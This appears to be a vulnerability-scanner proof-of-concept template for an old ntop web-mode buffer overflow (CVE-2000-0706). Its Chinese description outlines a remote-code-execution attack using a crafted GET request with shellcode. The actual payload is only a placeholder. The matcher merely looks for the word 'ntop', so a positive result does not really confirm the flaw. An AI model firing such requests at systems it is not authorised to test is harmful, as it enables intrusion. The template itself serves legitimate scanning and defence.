[info]
author = "AVE"
description = "ntop 1.2 a7-9/1.3.1 Web模式(-w)存在缓冲区溢出漏洞，通过向ntop HTTP服务发送特制的GET请求（路径中包含NOP滑板+shellcode+返回地址），可触发栈溢出实现远程代码执行。该PoC发送包含shellcode的恶意GET请求验证漏洞存在。"
id = "POC-AVE-2000-0556"
name = "ntop Web模式远程缓冲区溢出 PoC"
severity = "critical"
tags = [
    "cve-2000-0706",
    "ntop",
    "buffer-overflow",
    "rce",
]
vuln_id = [
    "CVE-2000-0706",
    "AVE-2000-0556",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{payload}}"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["ntop"]
